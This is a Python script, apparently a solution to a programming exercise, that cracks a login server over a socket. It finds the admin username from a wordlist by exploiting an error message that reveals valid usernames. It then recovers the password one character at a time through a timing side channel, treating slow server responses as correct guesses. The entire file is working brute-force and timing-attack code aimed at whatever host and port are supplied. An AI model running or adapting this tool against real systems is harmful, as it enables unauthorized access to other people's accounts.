import sys
import socket
import itertools
import json

from string import ascii_lowercase, ascii_uppercase, digits
from time import perf_counter

# constant parameters
MAX_PWD_LEN = 20
RECV_SIZE = 1024
PASSWORD_FILE = "passwords.txt"
ADMIN_FILE = "logins.txt"


def read_file(file):
    with open(file) as f:
        for line in f:
            yield line.strip()


def case_combinations_of(s):
    case_combinations = list(map("".join, itertools.product(*zip(s.upper(), s.lower()))))
    for candidate in list(case_combinations):
        yield candidate


def login_to_json(username, password=" "):
    login_dict = {
                    "login": username,
                    "password": password
                 }

    return json.dumps(login_dict)


def password_cracker(hostname, port):
    cracked_login = {}

    # define context manager for socket
    with socket.socket() as s:
        address = (hostname, port)
        s.connect(address)

        # find admin username
        # using vulnerability: admin username will be revealed if matches, even if password is incorrect
        for admin_username_guess in read_file(ADMIN_FILE):
            login_msg_json = login_to_json(admin_username_guess)
            data = login_msg_json.encode()

            s.send(data)
            response = s.recv(RECV_SIZE).decode()
            response_dict = json.loads(response)

            if response_dict["result"] == "Wrong password!":
                cracked_login["login"] = admin_username_guess
                break

        # find password
        # guess each character one by one - server will throw an exception if character is correct
        password_candidate = []
        while True:
            for c in ascii_lowercase + ascii_uppercase + digits:
                password_candidate.append(c)
                password_guess = "".join(password_candidate)
                login_msg_json = login_to_json(admin_username_guess, password_guess)

                data = login_msg_json.encode()
                s.send(data)

                response_t0 = perf_counter()
                response = s.recv(RECV_SIZE)
                response_t1 = perf_counter()
                response = response.decode()  # taking decode out of perf-critical code path
                response_dict = json.loads(response)

                # response time >= 0.1s indicates a handled exception on the server-side:
                # this happens, when the guess was partially correct
                if response_t1 - response_t0 >= 0.1:
                    break
                elif response_dict["result"] == "Connection success!":
                    cracked_login["password"] = password_guess
                    print(json.dumps(cracked_login))
                    return

                password_candidate.pop()


if __name__ == "__main__":
    # obtain input
    args = sys.argv
    hostname = args[1]
    port = int(args[2])

    password_cracker(hostname, port)
